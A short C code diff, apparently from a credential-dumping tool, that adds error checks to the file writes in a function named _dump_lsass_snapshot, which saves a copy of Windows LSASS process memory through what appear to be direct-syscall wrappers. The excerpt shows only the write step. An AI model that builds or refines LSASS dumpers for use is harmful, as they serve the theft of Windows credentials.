@@ -273,13 +273,18 @@ static BOOL _dump_lsass_snapshot(DWORD lsassPid, const char *outPath)
     ULONG64 rangeSize = (ULONG64)viewSize;
 
     DWORD written = 0;
-    WriteFile(hFile, &hdr,      sizeof(hdr), &written, NULL);
-    WriteFile(hFile, &dir,      sizeof(dir), &written, NULL);
-    WriteFile(hFile, &nRanges,  sizeof(nRanges), &written, NULL);
-    WriteFile(hFile, &baseRva,  sizeof(baseRva), &written, NULL);
-    WriteFile(hFile, &rangeBase,sizeof(rangeBase), &written, NULL);
-    WriteFile(hFile, &rangeSize,sizeof(rangeSize), &written, NULL);
-    WriteFile(hFile, pView, (DWORD)viewSize, &written, NULL);
+    if (!WriteFile(hFile, &hdr,      sizeof(hdr), &written, NULL) || written != sizeof(hdr) ||
+        !WriteFile(hFile, &dir,      sizeof(dir), &written, NULL) || written != sizeof(dir) ||
+        !WriteFile(hFile, &nRanges,  sizeof(nRanges), &written, NULL) || written != sizeof(nRanges) ||
+        !WriteFile(hFile, &baseRva,  sizeof(baseRva), &written, NULL) || written != sizeof(baseRva) ||
+        !WriteFile(hFile, &rangeBase,sizeof(rangeBase), &written, NULL) || written != sizeof(rangeBase) ||
+        !WriteFile(hFile, &rangeSize,sizeof(rangeSize), &written, NULL) || written != sizeof(rangeSize) ||
+        !WriteFile(hFile, pView, (DWORD)viewSize, &written, NULL) || written != (DWORD)viewSize)
+    {
+        CloseHandle(hFile);
+        SC_NtUnmapViewOfSection(GetCurrentProcess(), pView);
+        return FALSE;
+    }
 
     CloseHandle(hFile);
     SC_NtUnmapViewOfSection(GetCurrentProcess(), pView);
